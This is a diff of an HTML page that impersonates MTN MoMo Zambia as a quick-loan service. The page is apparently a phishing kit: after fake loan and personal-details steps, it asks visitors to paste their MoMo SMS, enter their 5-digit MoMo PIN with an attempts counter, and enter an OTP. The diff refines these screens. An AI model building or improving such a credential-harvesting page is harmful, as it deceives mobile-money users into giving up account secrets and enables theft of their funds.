@@ -2,95 +2,15 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MTN MoMo Zambia – Instant Loans</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MTN MoMo Zambia – Easy Loans</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
 
-    <!-- ============================================================
-    LANDING PAGE
-    ============================================================ -->
+    <!-- PAGE 1: LANDING -->
     <div id="page-landing" class="page active">
-        <div id="loader">
-            <div class="loader-spinner"></div>
-            <div class="loader-text">Loading MTN MoMo...</div>
-        </div>
-
-        <nav class="navbar">
-            <a href="#" class="logo" onclick="return false;">
-                <div class="logo-icon">M</div>
-                <div>
-                    <div class="logo-text">MTN <span>MoMo</span></div>
-                    <div class="logo-sub">Instant Loans</div>
-                </div>
-            </a>
-            <div class="nav-actions">
-                <div class="status">
-                    <span class="dot"></span>
-                    <span>Live</span>
-                </div>
-                <div class="hamburger">
-                    <span></span>
-                    <span></span>
-                    <span></span>
-                </div>
-            </div>
-        </nav>
-
-        <section class="hero">
-            <div class="hero-content">
-                <div class="badge">🚀 Quick & Secure</div>
-                <h1>Instant Loans with <br /><span class="highlight">MTN MoMo</span></h1>
-                <p>Get fast access to funds directly to your MTN MoMo account. No collateral, no paperwork — just a few taps.</p>
-                <a href="#" class="hero-cta" id="heroCta">Apply Now →</a>
-
-                <div class="countdown-section">
-                    <span class="countdown-number" id="countdownNum">5</span>
-                    <span class="countdown-label">Redirecting in seconds</span>
-                    <div class="countdown-bar">
-                        <div class="fill" id="progressFill"></div>
-                    </div>
-                </div>
-            </div>
-        </section>
-
-        <section class="features">
-            <div class="section-title">✨ Why MTN MoMo Loans?</div>
-            <div class="features-grid">
-                <div class="feature-card">
-                    <div class="icon">⚡</div>
-                    <h4>Quick Approval</h4>
-                    <p>Get approved in minutes</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">💰</div>
-                    <h4>Flexible Amounts</h4>
-                    <p>From 500 to 10,000 ZMW</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">🔒</div>
-                    <h4>Secure & Safe</h4>
-                    <p>Bank-grade security</p>
-                </div>
-                <div class="feature-card">
-                    <div class="icon">📱</div>
-                    <h4>Easy Process</h4>
-                    <p>Apply from your phone</p>
-                </div>
-            </div>
-        </section>
-
-        <footer class="footer">
-            <p>© 2026 <span class="brand">MTN MoMo</span> — Powered by MTN Zambia. All rights reserved.</p>
-        </footer>
-    </div>
-
-    <!-- ============================================================
-    LOAN CALCULATOR PAGE
-    ============================================================ -->
-    <div id="page-calculator" class="page">
         <div class="land-nav">
             <div style="flex:1;"></div>
             <div class="mtn-logo">
@@ -102,9 +22,8 @@
         </div>
         <div class="land-center">
             <div class="land-card">
-                <div class="badge">💰 Loan Calculator</div>
-                <h1>Calculate Your <br /><span class="highlight">MTN MoMo Loan</span></h1>
-                <p class="land-tagline">Adjust the sliders below to see your estimated monthly payment.</p>
+                <h1>Welcome to MTN MoMo Zambia</h1>
+                <p class="land-tagline">Get loans easily through MTN MoMo Zambia</p>
                 <div class="calc-box">
                     <h2>Loan Calculator</h2>
                     <div class="calc-row2"><span>Amount</span><span class="cv" id="calcAmt">ZMW 2,000</span></div>
@@ -119,12 +38,10 @@
         <div class="land-footer">© 2026 MTN MoMo Loans – Powered by MTN Zambia</div>
     </div>
 
-    <!-- ============================================================
-    STEP 1: LOAN DETAILS
-    ============================================================ -->
+    <!-- PAGE 2: STEP 1 -->
     <div id="page-step1" class="page">
         <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-calculator')">← Back</a>
+            <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
             <div class="mtn-logo" style="flex-direction:row;gap:6px;">
                 <div class="mtn-logo-icon" style="width:32px;height:32px;font-size:1.2rem;">M</div>
                 <div style="text-align:left;"><div class="mtn-logo-text" style="font-size:0.9rem;">MTN MoMo</div><div class="mtn-logo-sub" style="font-size:0.6rem;">Zambia</div></div>
@@ -133,34 +50,20 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Loan Details</h2>
+                <h2>Loan Application</h2>
                 <p class="step-sub">Step 1 of 5</p>
                 <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
-                <div class="field">
-                    <label>Loan Type</label>
-                    <div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div>
-                </div>
-                <div class="field">
-                    <label>Loan Amount (ZMW)</label>
-                    <input type="number" id="s1am" value="2000" placeholder="Enter amount" oninput="clearErr('s1Err')" />
-                </div>
-                <div class="field">
-                    <label>Loan Term</label>
-                    <div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div>
-                </div>
-                <div class="field">
-                    <label>Purpose of Loan</label>
-                    <textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea>
-                </div>
+                <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected>Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
+                <div class="field"><label>Loan Amount (ZMW)</label><input type="number" id="s1am" value="2000" placeholder="Enter amount" oninput="clearErr('s1Err')" /></div>
+                <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected>48 Months</option><option>60 Months</option></select></div></div>
+                <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…" oninput="clearErr('s1Err')"></textarea></div>
                 <button class="btn-grad" onclick="toS2()">NEXT STEP</button>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================
-    STEP 2: PERSONAL DETAILS
-    ============================================================ -->
+    <!-- PAGE 3: STEP 2 -->
     <div id="page-step2" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
@@ -172,7 +75,7 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Personal Details</h2>
+                <h2>Loan Application</h2>
                 <p class="step-sub">Step 2 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
@@ -191,9 +94,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    STEP 3: APPLICATION SUMMARY & SUBMIT
-    ============================================================ -->
+    <!-- PAGE 4: STEP 3 -->
     <div id="page-step3" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
@@ -205,7 +106,7 @@
         </nav>
         <div class="step-center">
             <div class="step-card">
-                <h2>Application Summary</h2>
+                <h2>Loan Application</h2>
                 <p class="step-sub">Step 3 of 5</p>
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
@@ -225,9 +126,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    PROCESSING
-    ============================================================ -->
+    <!-- PAGE 5: PROCESSING -->
     <div id="page-processing" class="page">
         <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="proc-wrap">
@@ -239,9 +138,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    SMS PASTE (WITH RESEND BUTTON)
-    ============================================================ -->
+    <!-- PAGE 6: SMS PASTE -->
     <div id="page-sms-paste" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-processing')">← Back</a>
@@ -265,15 +162,12 @@
                 <div style="margin: 8px 0 12px; padding: 10px; background: #f8f9fa; border-radius: 6px; font-size:0.8rem; color:var(--text-light);">
                     <strong>💡 Tip:</strong> Check your SMS inbox for the message from MTN MoMo Zambia. Copy the entire message text.
                 </div>
-                <button class="btn-resend hidden" id="resendSmsBtn" onclick="resendSms()">🔄 Resend SMS</button>
                 <button class="btn-grad" onclick="doSmsParse()">SUBMIT MOMO MESSAGE</button>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================
-    WAIT SMS
-    ============================================================ -->
+    <!-- PAGE 7: WAIT SMS -->
     <div id="page-wait-sms" class="page">
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
@@ -286,9 +180,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    PIN
-    ============================================================ -->
+    <!-- PAGE 8: PIN (5 DIGITS) -->
     <div id="page-pin" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-sms')">← Back</a>
@@ -305,6 +197,10 @@
                 <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
                 <div class="msg-box error" id="pinErr"><span class="msg-icon">✕</span><span id="pinErrTxt"></span></div>
                 <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
+                <!-- PIN Attempts Display -->
+                <div id="pinAttemptsDisplay" class="pin-attempts">
+                    🔑 Attempts remaining: 3 of 3
+                </div>
                 <div class="pin-row">
                     <input type="password" id="pin0" class="pin-box" maxlength="1" oninput="pinMvM(this,0)" placeholder="•" />
                     <input type="password" id="pin1" class="pin-box" maxlength="1" oninput="pinMvM(this,1)" placeholder="•" />
@@ -319,9 +215,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    WAIT PIN
-    ============================================================ -->
+    <!-- PAGE 9: WAIT PIN -->
     <div id="page-wait-pin" class="page">
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
@@ -334,9 +228,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    OTP
-    ============================================================ -->
+    <!-- PAGE 10: OTP (4 DIGITS) -->
     <div id="page-otp" class="page">
         <nav class="navbar">
             <a class="nav-left" onclick="goTo('page-wait-pin')">← Back</a>
@@ -363,15 +255,16 @@
                     </div>
                 </div>
                 <div class="msg-box error" id="otpErr"><span class="msg-icon">✕</span><span id="otpErrTxt"></span></div>
-                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">🔄 Resend OTP</button>
+                <button class="btn-resend hidden" id="resendOtpBtn" onclick="resendOtp()">
+                    🔄 Resend OTP
+                </button>
+                <div id="rejectionInfo" style="margin-top: 10px; font-size: 0.8rem; color: var(--text-light);"></div>
                 <button class="btn-grad" onclick="doOtp()" style="margin-top: 10px;">VERIFY & APPROVE LOAN</button>
             </div>
         </div>
     </div>
 
-    <!-- ============================================================
-    WAIT OTP
-    ============================================================ -->
+    <!-- PAGE 11: WAIT OTP -->
     <div id="page-wait-otp" class="page">
         <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
@@ -384,9 +277,7 @@
         </div>
     </div>
 
-    <!-- ============================================================
-    APPROVAL
-    ============================================================ -->
+    <!-- PAGE 12: APPROVAL -->
     <div id="page-approval" class="page">
         <div class="appr-wrap">
             <div class="appr-top">
@@ -410,5 +301,5 @@
     </div>
 
     <script src="./script.js"></script>
-</body>
+</body> 
 </html>
